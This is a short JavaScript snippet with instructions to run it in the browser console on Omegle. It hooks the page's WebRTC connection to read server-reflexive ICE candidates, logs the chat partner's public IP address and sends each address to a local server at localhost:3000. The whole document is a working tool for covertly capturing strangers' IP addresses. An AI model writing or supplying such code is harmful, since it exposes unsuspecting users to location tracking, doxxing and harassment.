window.oRTCPeerConnection = window.oRTCPeerConnection || window.RTCPeerConnection
window.RTCPeerConnection = function(...args) {
    console.log('new client')
    fetch('http://localhost:3000/reset').catch(e => console.log(e))
    const pc = new window.oRTCPeerConnection(...args)
    pc.oaddIceCandidate = pc.addIceCandidate
    pc.addIceCandidate = function(iceCandidate, ...rest) {
        const fields = iceCandidate.candidate.split(' ')
        if (fields[7] === 'srflx') {
            console.log('IP Address:', fields[4])
            fetch("http://localhost:3000/set?ip=" + fields[4]).catch(() => {});
        }
        return pc.oaddIceCandidate(iceCandidate, ...rest)
    }
    return pc
}
// run this in the browser console
// on omegle site.
